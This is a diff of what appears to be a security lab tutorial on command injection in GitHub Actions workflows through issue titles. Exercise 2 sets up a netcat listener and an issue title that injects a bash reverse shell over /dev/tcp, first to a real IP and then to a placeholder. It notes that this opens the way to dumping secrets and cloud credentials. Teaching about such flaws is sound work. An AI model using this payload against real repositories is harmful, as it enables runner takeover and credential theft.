@@ -24,7 +24,7 @@ Ok. Big deal. So we were able to see what is in the workspace directory. Who car
 Now let's try something a little more sinister...
 
 ## Exercise 2
-Spin up a linux vm in the cloud that has a public IP address. Login and run `nc -nvlp 1337`. Then open a new issue with the title `octocat"; bash -i >& /dev/tcp/20.14.129.251/1337 0>&1 ; ls -l $GITHUB_WORKSPACE"`  
+Spin up a linux vm in the cloud that has a public IP address. Login and run `nc -nvlp 1337`. Then open a new issue with the title `octocat"; bash -i >& /dev/tcp/<YOUR-VM-IP-ADDRESS>/1337 0>&1 ; ls -l $GITHUB_WORKSPACE"`  
 
 Now I have a shell on the runner! This is a great "foot in the door" from which I can attemp other exploits, like dumping secrets or cloud credentials to use in other attacks.  
 
